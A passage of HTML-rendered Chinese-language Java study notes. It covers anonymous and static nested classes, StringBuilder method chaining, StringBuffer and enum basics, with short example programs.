&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{};&lt;/span> &lt;span style="color:#75715e">// 匿名类!
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;B&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>静态内部类示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#111">sn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">NAME&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;OUTER&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">NAME&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用&lt;code>static&lt;/code>修饰的内部类和Inner Class有很大的不同，它不再依附于&lt;code>Outer&lt;/code>的实例，而是一个完全独立的类，因此无法引用&lt;code>Outer.this&lt;/code>，但它仍然可以访问&lt;code>Outer&lt;/code>的&lt;code>private&lt;/code>静态字段和静态方法；如果把&lt;code>StaticNested&lt;/code>移到&lt;code>Outer&lt;/code>之外，就失去了访问&lt;code>private&lt;/code>的权限&lt;/p>
&lt;h2 id="java核心类部分">Java核心类(部分)&lt;/h2>
&lt;h3 id="stringbuilder">StringBuilder&lt;/h3>
&lt;ul>
&lt;li>是一个可变对象，可以预分配缓冲区，向其中新增字符时，不会创建新的临时对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>可链式操作&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Mr &amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insert&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>实现的关键是定义的&lt;code>append()&lt;/code>方法会返回&lt;code>this&lt;/code>，这样就可以不断调用自身的其他方法；仿写链式调用函数&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#111">adder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Adder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Adder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">++;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>StringBuffer&lt;/code>和&lt;code>StringBuilder&lt;/code>接口完全相同，是早期版本，通过同步来保证多个线程操作&lt;code>StringBuffer&lt;/code>也是安全的，但是同步会带来执行速度的下降&lt;/li>
&lt;/ul>
&lt;h3 id="enum">enum&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SAT&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 只需依次列出枚举的常量名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>常量本身带有类型信息，即&lt;code>Weekday.SUN&lt;/code>类型是&lt;code>Weekday&lt;/code>，编译器会自动检查出类型错误&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不可能引用到非枚举的值，因为无法通过编译&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不同类型的枚举不能互相比较或者赋值，因为类型不符&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>虽然也是引用类型，但因为其在JVM中只有唯一实例，所以可以直接用&lt;code>==&lt;/code>比较&lt;/p>
&lt;/li>
&lt;li>
&lt;p>继承自&lt;code>java.lang.Enum&lt;/code>，无法被继承，无法new实例&lt;/p>
&lt;/li>
&lt;li>
&lt;p>枚举类的字段也可以是非final类型，即可以在运行期修改，但是不推荐这样&lt;/p>
&lt;/li>
&lt;li>
&lt;p>天生适合switch，具有类型信息和有限个枚举常量&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
